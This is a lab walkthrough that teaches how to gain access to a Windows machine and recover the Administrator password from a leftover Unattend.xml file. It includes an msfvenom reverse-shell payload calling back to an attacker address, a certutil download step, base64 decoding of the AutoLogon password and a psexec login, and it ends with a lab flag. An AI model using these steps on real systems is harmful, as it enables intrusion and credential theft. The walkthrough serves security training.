# Searching For Passwords in Windows Configuration Files

- Windows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems.

- This is typically done through the use of the Unattended Windows Setup utility, which is used to automate the mass installation/deployment of Windows on systems.

- This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account’s password.

- If the Unattended Windows Setup configuration files are left on the target system after installation, they can reveal user account credentials that can be used by attackers to authenticate with Windows target legitimately.

## Unattended Windows Setup

- The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
    + C:\Windows\Panther\Unattend.xml
    + C:\Windows\Panther\Autounattend.xml

- As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64.

## Laboratory

For this laboratory, the attacker machine and the target machine ara available for use.

### Getting Initial Access

- First step is to generate a meterpreter payload using msfvenom `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ATTACKER_ADDRESS LPORT=$ATTACKER_PORT -f exe > payload.exe`.

**Note**: In this case we know the system is running a x64 version, in case of not knowing the architecture, use x86-32 so you will be sure it will work every time.

- Next step is to expose those files using the module `SimpleHTTPServer` of python `python -m SimpleHTTPServer 80` so you can download the payload from the target machine. Download the payload using `certutil -urlcache -f http://x.x.x.x/path-to-source-file path-to-destination-file` or through the browser.

**Note**: Remember port 80 is the standard but you could use any port.

- Start the `multi/handler` in the msfconsole and configure RHOST, LHOST and LPORT you configured.

**Note**: Remeber to change payload to the one that you used when using multi/handler.

### Getting and Exploiting Unattend File

- Once the meterpreter session is established, you could run a search command to look up for Unattend.xml files `search -f Unattend.xml`. In this case we know where the file would likely be and we can try to look it up by ourselves manually. Go to `C:\Windows\Panther` and you should find the file there.

- Download the file to your machine and perform a little bit of search inside the file. The tag you are looking is `<AutoLogon>` and there you should find the password set for the corresponding users, including administrator password. Save the password you want to decode to the file password.txt.

- The password will come coded as base64. Decode it using `base64 -d password.txt`.

- Now we can run psexec.py to establish a command shell between the target and us with the password obtained from the configuration file `psexec.py Administrator@x.x.x.x` and it will ask you for the password.

**Note**: It is possible that target changed the password of the Administrator account at some point, in that case the password won't be valid anymore.

Flag: 097ab83639dce0ab3429cb0349493f60
